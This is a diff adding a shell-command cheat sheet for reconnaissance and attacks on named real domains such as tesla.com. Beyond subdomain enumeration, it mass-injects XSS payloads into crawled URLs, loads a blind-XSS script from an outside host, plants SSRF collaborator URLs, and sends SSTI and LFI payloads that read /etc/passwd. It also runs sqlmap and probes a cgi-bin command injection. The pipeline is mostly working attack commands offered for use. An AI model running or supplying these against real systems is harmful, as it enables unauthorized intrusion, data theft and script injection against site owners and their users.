@@ -1,0 +1,96 @@
+rm -rf /home/ibrahim/0Recon/*.txt 
+                                    SUBDOMAIN ENUMERATION 
+assetfinder  -subs-only tesla.com | tee -a /home/ibrahim/0Recon/assetfinder.txt 
+
+subfinder -d tesla.com -silent >> /home/ibrahim/0Recon/subfinder.txt
+
+findomain -t tesla.com | tee -a /home/ibrahim/0Recon/findomain.txt 
+
+amass enum -passive -d tesla.com -o /home/ibrahim/0Recon/amass.txt
+
+curl -s "https://jldc.me/anubis/subdomains/tesla.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew >> /home/ibrahim/0Recon/juldc.txt
+
+curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >>  /home/ibrahim/0Recon/crt.txt
+
+cat /home/ibrahim/0Recon/*.txt | sort -u >> /home/ibrahim/0Recon/allsub.txt
+
+
+
+        FIND LIVE SUBDOMAIN 
+        
+Httpx grep only ips
+
+cat /home/ibrahim/0Recon/allsub.txt | httpx -ip -silent -timeout 10 | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | tee /home/ibrahim/0Recon/domains-ips.txt
+
+uncover -q payu.com -e censys,fofa,zoomeye,shodan,shodan-idb | httpx -status-code | grep 200 | cut -d " " -f1 | tee -a /home/ibrahim/0Recon/domainsips.txt 
+
+       
+cat /home/ibrahim/0Recon/allsub.txt | httpx -status-code | grep 200 | cut -d " " -f1 | tee -a /home/ibrahim/0Recon/allsublive200.txt
+
+cat /home/ibrahim/0Recon/allsub.txt | httpx -status-code | grep 403 | cut -d " " -f1 | tee -a /home/ibrahim/0Recon/reconlive403.txt
+
+cat /home/ibrahim/0Recon/allsub.txt | httprobe | tee -a /home/ibrahim/0Recon/allsublive.txt
+
+subzy --targets  /home/ibrahim/0Recon/allsublive.txt -hide_fails
+
+cat /home/ibrahim/0Recon/allsublive.txt | cut -d ' ' -f1  | grep --color 'dmz\|api\|staging\|env\|v1\|stag\|prod\|dev\|stg\|test\|demo\|pre\|admin\|beta\|vpn\|cdn\|coll\|sandbox\|qa\|intra\api\|dev\|test\|login\|upload\|cms\|demo\|stage\|pre\|vpn'| tee -a /home/ibrahim/0Recon/juicy.txt
+
+cat /home/ibrahim/0Recon/juicy.txt | httpx -status-code
+
+FINDING LOGIN PANEL OF ALL LIVE SUBDOMAIN AND CHECK FOR SQLI
+
+python3 logsensor.py -f /home/ibrahim/0Recon/allsublive.txt
+
+FINDING APIKEY JS SUB
+  
+python3 SubDomainizer.py -l /home/ibrahim/0Recon/allsublive.txt
+
+FINDING S3BUCKET MISCONF
+
+cat /home/ibrahim/0Recon/allsublive.txt | gospider -d 5 --sitemap --robots -w -r --subs | grep "\[aws-s3" | sed 's/\[aws-s3\] - //g' | httpx -silent -mr "NoSuchBucket" | tee /home/ibrahim/0Recon/s3-bucket-takeover.txt
+
+XSS FINDING ON ALL SUBDOMAIN
+
+./param.sh /home/ibrahim/0Recon/allsublive.txt
+
+cat /home/ibrahim/0Recon/allsublive.txt | gauplus | tee -a /home/ibrahim/0Recon/gauplus.txt
+
+cat /home/ibrahim/0Recon/allsublive.txt | hakrawler | tee -a /home/ibrahim/0Recon/hakrawler.txt
+
+katana -list /home/ibrahim/0Recon/allsublive.txt | tee -a /home/ibrahim/0Recon/katana.txt
+
+cat /home/ibrahim/0Recon/allsublive.txt | waybackurls >> /home/ibrahim/0Recon/waybackurls.txt
+
+cat /home/ibrahim/0Recon/paramspider.txt gauplus.txt hakrawler.txt katana.txt waybackurls.txt | sort -u >> /home/ibrahim/0Recon/allurls.txt
+
+cat /home/ibrahim/0Recon/allurls.txt | sed 's/FUZZ/ /g' >> /home/ibrahim/0Recon/allurlsnofuzz.txt
+
+cat /home/ibrahim/0Recon/allurlsnofuzz.txt | sed -e 's/\.gif\|.html\|.rss\|.cfm\|.htm\|.jpg\|.mp4\|.css\|.jpeg\|.png\|.svg\|.ico\|.mp3\|.mp4//' >> /home/ibrahim/0Recon/allurlsfinal.txt
+
+
+cat /home/ibrahim/0Recon/allurlsfinal.txt | gf xss | qsreplace '"><img src=x onerror=alert(1);>' | freq | tee -a /home/ibrahim/0Recon/xss-vuln.txt
+
+
+cat /home/ibrahim/0Recon/allurlsfinal.txt | bxss -payload '"><script src=https://Nigeria.xss.ht></script>' -header "X-Forwarded-For"
+
+cat /home/ibrahim/0Recon/allurlsfinal.txt | gf ssrf | grep "=" | qsreplace http://YOUR.burpcollaborator.net >> /home/ibrahim/0Recon/ssrf.txt
+
+ffuf -u "FUZZ" -w /home/ibrahim/0Recon/ssrf.txt -mc 200
+
+cat /home/ibrahim/0Recon/allurlsfinal.txt | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep "root:x"
+
+cat /home/ibrahim/0Recon/allurlsfinal.txt | gf lfi | httpx -path /etc/passwd -mc 200 -match-string 'root:x:'
+
+cat /home/ibrahim/0Recon/allurlsfinal.txt | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+
+cat /home/ibrahim/0Recon/allurlsfinal.txt | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
+
+
+cat /home/ibrahim/0Recon/allurlsfinal.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent
+
+FUZZING
+
+for i in `cat /home/ibrahim/0Recon/reconlive.txt`; do ffuf -u $i/FUZZ -w wordlist.txt -mc 200,302,401 -se ;done
+
+for url in $(cat targets.txt); do ffuf -ac -fc 404,403 -w wordlist.txt -u $url/FUZZ >> results.txt; done && sort -u results.txt | grep -E '^https?://' > results.txt
+
